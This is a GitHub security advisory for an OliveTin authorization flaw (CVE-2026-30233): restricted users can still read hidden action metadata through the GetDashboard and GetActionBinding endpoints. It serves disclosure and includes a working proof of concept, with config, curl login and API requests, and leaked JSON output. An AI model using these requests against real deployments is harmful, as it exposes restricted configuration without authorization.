# [M] OliveTin doesn't check view permission when returning dashboards

## Summary
Severity: Medium
Advisory: GHSA-jf73-858c-54pg
CVE: CVE-2026-30233
CWE: CWE-200, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-jf73-858c-54pg
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0 <0.0.0-20260305082002-d7962710e7c4

## Details
### Summary
An authorization flaw in OliveTin allows authenticated users with view: false permission to enumerate action bindings and metadata via dashboard and API endpoints.

Although execution (exec) may be correctly denied, the backend does not enforce IsAllowedView() when constructing dashboard and action binding responses. As a result, restricted users can retrieve action titles, IDs, icons, and argument metadata.

### Details
OliveTin defines a view permission in its ACL model (acl.go). However, this permission is not consistently enforced when building dashboard and action metadata responses.

Relevant source locations:

dashboards.go (around line 120, 132)
apiActions.go (around line 122)
acl.go (around line 125)
api.go (around line 430)

Dashboard building logic:
```
for _, binding := range rr.ex.MapActionBindings {
    if binding.Action.Hidden { continue }
    action := buildAction(binding, rr) // checks IsAllowedExec only
    fieldset.Contents = append(fieldset.Contents, ...)
}
```
Why vulnerable: IsAllowedView() exists but is not enforced when building dashboard/action metadata. Users with view:false still receive action titles/icons/argument metadata (with canExec:false).

### PoC




1. Configure OliveTin with a restricted user:

Create config.yaml:

```yaml
authRequireGuestsToLogin: true

authLocalUsers:
  enabled: true
  users:
    - username: admin
      password: "$argon2id$v=19$m=65536,t=4,p=2$puyxA0s555TSFx7hnFLCXA$PyhLGpZtvpMMvc2DgMWkM8OJMKO55euwV5gm//1iwx4"  # password: admin123
      permissions:
        view: true
        exec: true
        logs: true
    
    - username: low
      password: "$argon2id$v=19$m=65536,t=4,p=2$puyxA0s555TSFx7hnFLCXA$PyhLGpZtvpMMvc2DgMWkM8OJMKO55euwV5gm//1iwx4"  # password: low123
      permissions:
        view: false   # Should hide all actions
        exec: false
        logs: false

actions:
  - title: "Secret Action"
    id: secret_action
    shell: echo "sensitive operation"
    icon: "🔒"
    description: "This action should be completely hidden"
    arguments:
      - name: target
        title: Target
        type: string
        default: production
```
2. Start OliveTin with this configuration

3. Login as low-privilege user and capture session ID:

```bash
# Login as low user
LOW_SID=$(curl -s -i -X POST http://localhost:1337/api/LocalUserLogin \
  -H 'Content-Type: application/json' \
  -d '{"username":"low","password":"low123"}' \
  | awk -F'[=;]' '/^Set-Cookie: olivetin-sid-local=/{print $2; exit}' | tr -d ' ')

echo "Low user SID: $LOW_SID"
```
4. Verify the web UI respects view:false (optional but illustrative):

Open http://localhost:1337 in a browser logged in as low user - the "Secret Action" should NOT appear in the UI.

5. Test 1: GetDashboard endpoint leaks action metadata:

```bash
curl -s -X POST http://localhost:1337/api/GetDashboard \
  -H 'Content-Type: application/json' \
  -H "Cookie: olivetin-sid-local=$LOW_SID" \
  -d '{"title":"Actions"}' | jq '.fieldsets[0].contents[] | select(.action.bindingId=="secret_action")'
```
Expected behavior (if fixed): Empty result or no matching action
Observed behavior (vulnerable):

```json
{
  "action": {
    "bindingId": "secret_action",
    "title": "Secret Action",
    "icon": "🔒",
    "description": "This action should be completely hidden",
    "canExec": false,
    "arguments": [
      {
        "name": "target",
        "title": "Target",
        "type": "string",
        "default": "production"
      }
    ]
  }
}
```
6. Test 2: GetActionBinding endpoint directly exposes action details:

```bash
curl -s -X POST http://localhost:1337/api/GetActionBinding \
  -H 'Content-Type: application/json' \
  -H "Cookie: olivetin-sid-local=$LOW_SID" \
  -d '{"bindingId":"secret_action"}' | jq '.'
```
Expected behavior (if fixed): HTTP 403 Permission Denied
Observed behavior (vulnerable):

```json
{
  "action": {
    "bindingId": "secret_action",
    "title": "Secret Action",
    "icon": "🔒",
    "description": "This action should be completely hidden",
    "canExec": false,
    "arguments": [...]
  }
}
```

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-jf73-858c-54pg
- https://nvd.nist.gov/vuln/detail/CVE-2026-30233
- https://github.com/OliveTin/OliveTin/commit/d7962710e7c46f6bdda4188b5b0cdbde4be665a0
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1
